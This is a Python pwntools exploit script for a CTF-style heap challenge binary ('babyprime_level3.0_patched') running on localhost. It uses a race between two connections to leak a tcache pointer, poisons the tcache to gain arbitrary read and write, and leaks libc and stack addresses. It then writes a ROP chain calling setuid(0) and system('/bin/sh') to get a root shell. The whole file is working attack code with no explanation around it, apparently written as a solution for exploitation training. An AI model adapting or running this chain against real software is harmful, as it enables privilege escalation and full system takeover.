import time 
from pwn import *
import os

idx = 2

def leak_tcache(r1, r2):
    if os.fork() == 0:
        for _ in range(10000):
            try:
                r1.sendline(b"malloc 0")
                r1.sendline(b"scanf 0")
                r1.sendline(b"AAAABBBB")
                r1.sendline(b"free 0")
            except:
                pass
        exit(0)
    else:
        for _ in range(10000):
            try:
                r2.sendline(b"printf 0")
            except:
                pass
        os.wait()
    
    try:
        output_set = set(r2.clean().splitlines())
        print(output_set)
        for output in output_set:
            output = output[9:]
            if output[:1] != b'\x41' and b'\x07' in output:
                result = output[:6]
                print(result)
                return u64(result.ljust(8, b'\x00'))
    except Exception as e:
        print(f"Leak parsing failed: {e}")
    return 0

def controlled_allocations(r1, r2, addr, heap_base_addr):
    global idx
    try:
        r1.clean()
        r2.clean()
    except:
        pass
    
    addr_packed = p64(addr ^ heap_base_addr)
    xor_result = addr ^ heap_base_addr
    print(f"addr: {hex(addr)}")
    print(f"heap_base: {hex(heap_base_addr)}")  
    print(f"XOR result: {hex(xor_result)}")
    
    try:
        r1.sendline(f"malloc {idx}".encode())
        r1.sendline(f"malloc {idx + 1}".encode())
        r1.sendline(f"free {idx + 1}".encode())
    except Exception as e:
        print(f"Setup failed: {e}")
        return False
    
    max_attempts = 100
    attempts = 0
    
    while attempts < max_attempts:
        try:
            if os.fork() == 0:
                r1.sendline(f"free {idx}".encode())
                os.kill(os.getpid(), 9)
            else:
                r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
                os.wait()
        except Exception as e:
            print(f"Race attempt {attempts} failed: {e}")
            attempts += 1
            continue
        
        time.sleep(0.1)
        
        try:
            r1.sendline(f"malloc {idx}".encode())
            r1.sendline(f"printf {idx}".encode())
            r1.readuntil(b"MESSAGE: ", timeout=2)
            stored = r1.readline()[:-1]
        except Exception as e:
            print(f"Verification failed: {e}")
            attempts += 1
            continue
        
        if stored == addr_packed.split(b'\x00')[0]:
            break
        attempts += 1
    
    if attempts >= max_attempts:
        print("Failed to achieve race condition")
        return False
    
    try:
        r1.sendline(f"malloc {idx + 1}".encode())
        r1.clean()
        idx += 2
        return True
    except Exception as e:
        print(f"Final allocation failed: {e}")
        return False

def arbitrary_read(r1, r2, addr, heap_base_addr):
    global idx
    if not controlled_allocations(r1, r2, addr, heap_base_addr):
        return 0
    
    try:
        r1.sendline(f"printf {idx - 1}".encode())
        r1.readuntil(b"MESSAGE: ", timeout=2)
        output = r1.readline()[:-1]
        leak = u64(output.ljust(8, b'\x00'))
        return leak
    except Exception as e:
        print(f"Arbitrary read failed: {e}")
        return 0

def arbitrary_write(r1, r2, addr, heap_base_addr, content):
    global idx
    if not controlled_allocations(r1, r2, addr, heap_base_addr):
        return False
    
    try:
        r1.sendline(f"scanf {idx - 1}".encode())
        r1.sendline(content)
        return True
    except Exception as e:
        print(f"Arbitrary write failed: {e}")
        return False

def exploit(r1, r2, p):
    leak = leak_tcache(r1, r2)
    if not leak:
        print("Failed to leak")
        return False
    
    heap_base = leak
    print("tcache next pointer: ", hex(heap_base))
    
    location1 = (leak << 12) + 0x8a0
    libc_leak = arbitrary_read(r1, r2, location1, heap_base)
    if not libc_leak:
        print("Failed to leak libc")
        return False
    
    print("libc leak: ", hex(libc_leak))
    libc_base = libc_leak - 0x219c80

    location2 = libc_leak + 0x8b0
    print("location2: ", hex(location2))
    print(f"\nGDB: gdb -p {p.pid}")
    pause()	
    
    stack_leak = arbitrary_read(r1, r2, location2, heap_base + 1)
    if not stack_leak:
        print("Failed to leak stack")
        return False
    
    # 0x7fee20
    print("stack leak: ", hex(stack_leak))
    rbp_addr = stack_leak - 0x134c
    print("rbp location: ", hex(rbp_addr))

    # gadgets
    binsh_addr = libc_base + 0x1d8698
    setuid = libc_base + 0xec0d0
    system = libc_base + 0x50d70
    pop_rdi = libc_base + 0x000000000002a3e5
    
    payload = p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(setuid)
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system)
    
    print(f"\nGDB: gdb -p {p.pid}")
    pause()
    
    if not arbitrary_write(r1, r2, rbp_addr, heap_base + 1, payload):
        print("Failed to write payload")
        return False
    
    try:
        r1.clean()
        r2.clean()
        r1.sendline(b"ls")
        r2.sendline(b"ls")
        response = r1.recvall(timeout=2)
        response2 = r2.recvall(timeout=2)
        print(response)
        print(response2)
    except Exception as e:
        print(f"Final command execution failed: {e}")
    
    return True

def main(): 
    max_attempts = 50
    attempt = 0 
    
    while attempt < max_attempts:
        print(f"\nAttempt {attempt + 1}/{max_attempts}")
        
        global idx 
        idx = 2
        
        p = None
        r1 = None
        r2 = None
        
        try:
            binary = './babyprime_level3.0_patched'
            p = process(binary)
            r1 = remote("localhost", 1337)
            r2 = remote("localhost", 1337)

            if exploit(r1, r2, p):
                print("Exploit successful!")
                break 
        except Exception as e:
            print(f"Error in attempt {attempt + 1}: {e}")
        finally:
            # Proper cleanup
            for conn in [r1, r2]:
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
            if p:
                try:
                    p.kill()
                except:
                    pass
        attempt += 1
    
    if attempt >= max_attempts:
        print("Max attempts reached, exploit failed")

if __name__ == "__main__":
    main()
